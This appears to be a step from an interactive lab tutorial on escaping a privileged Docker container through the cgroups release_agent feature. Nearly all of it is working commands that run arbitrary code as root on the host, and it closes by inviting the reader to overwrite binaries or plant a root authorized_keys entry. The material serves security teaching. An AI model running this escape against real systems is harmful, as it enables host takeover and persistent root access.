## Escaping via cgroups _agent

When inside of a container running in privileged mode (as determined in steps 1-2) we can escape using the release_agent feature of cgroups.

### Start a privileged container

First, start an interactive shell inside a privileged container.  The remainder of the commands in this step will run inside the container, except for the last one.

```
docker run -it ubuntu:18.04 bash
```{{execute}}

### Mount cgroups inside the container

Next, we mount the cgroups filesystem within the container so that we can manipulate it:

```
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
```{{execute}}

### Create a cgroup with crafted release_agent

Now we create a cgroup with a release agent that can execute on the host an arbitrary command from the container's "/cmd" file:

```
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```{{execute}}

### Specify the command

We could place any command inside this file.  We'll use ps as an example:

```
cat > /cmd <<EOF
#!/bin/sh
ps aux > $host_path/output 2>&1
EOF
chmod a+x /cmd
```{{execute}}

The output is sent to the container's "/output" file, so that we can see it from within the container:

```
cat /output
```{{execute}}

### Run a process in the cgroup to trigger the release_agent

The release_agent runs when all processes have exited from the cgroup.  This feature is intended to provide a hook to clean up the cgroups themselves after they are no longer used.

The following command puts the "sh" process's ID into the cgroup we've configured.  The "sh" process exits immediately after, as it has no more commands to run, which triggers the release_agent to run.

```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```{{execute}}

Inspect the output:

```
cat /output
```{{execute}}

To see how different that output is from running "ps" inside the container, run "ps" inside the container:

```
ps aux
```{{execute}}

### Try another command...

Now try modifying the command ("ps aux") inside of "/cmd" to run something
else.  Can you overwrite a binary, install an authorized_keys entry for root,
or add a .bashrc for root?
